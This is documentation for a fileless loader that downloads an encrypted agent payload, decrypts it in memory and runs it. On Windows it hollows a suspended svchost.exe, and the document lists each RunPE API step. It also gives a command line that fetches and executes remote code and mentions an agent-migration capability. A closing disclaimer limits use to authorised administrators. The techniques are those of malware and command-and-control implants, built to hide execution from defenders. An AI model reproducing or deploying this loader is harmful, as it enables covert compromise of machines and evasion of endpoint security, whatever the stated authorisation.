# Launcher: Remote Payload Fetch and In-Memory Execution

The `launcher` binary is a tiny bootstrap that downloads an
AES-256-GCM-encrypted agent payload over HTTPS, decrypts it in process
memory using a pre-shared key, and runs it without ever materialising a
file on a real on-disk filesystem.

```text
launcher --url https://updates.example.com/agent.enc --key <BASE64-32B> \
         -- arg1 arg2 ...
```

## Per-platform execution path

| Platform | Primitive                                                          |
| -------- | ------------------------------------------------------------------ |
| Linux    | `memfd_create` + `execv("/proc/self/fd/<fd>")`                    |
| macOS    | Temp file under `$TMPDIR` + `execve` (development fallback only)   |
| Windows  | Process hollowing via the shared `hollowing` crate                 |

## Windows: process hollowing

On Windows the launcher delegates to `hollowing::hollow_and_execute`,
which performs the canonical RunPE sequence:

1. `CreateProcessW("C:\\Windows\\System32\\svchost.exe", CREATE_SUSPENDED | DETACHED_PROCESS)`
2. `VirtualAllocEx(hProcess, …, RWX)` for the payload region
3. `WriteProcessMemory` to copy the decrypted PE bytes
4. Read DOS+NT headers from the payload to compute the entry point
5. `GetThreadContext(hThread)` → set `Rcx` (x64) / `Eax` (x86) to the entry point → `SetThreadContext`
6. `ResumeThread(hThread)`

The same primitive backs the agent's `MigrateAgent` capability, so the
launcher and the agent share one tested code path.

## Verification

The launcher's `tests/hollowing_test.rs` integration test asserts:

* On Windows (`#[ignore]`d by default because it spawns processes): the
  primitive accepts a valid PE payload and returns success — the spawned
  host runs detached and is reaped by the system.
* On non-Windows: the cross-platform shim returns the documented
  controlled error string `"only available on Windows"` so callers can
  surface a clean diagnostic instead of crashing.

```sh
cargo test -p launcher --test hollowing_test
# On Windows, opt into the invasive test:
cargo test -p launcher --test hollowing_test -- --ignored
```

## Authorisation

`launcher` is intended **only** for use by administrators who own the
managed endpoint or have written authorisation to operate it. Running it
against systems you do not control may violate computer-misuse law in
your jurisdiction.
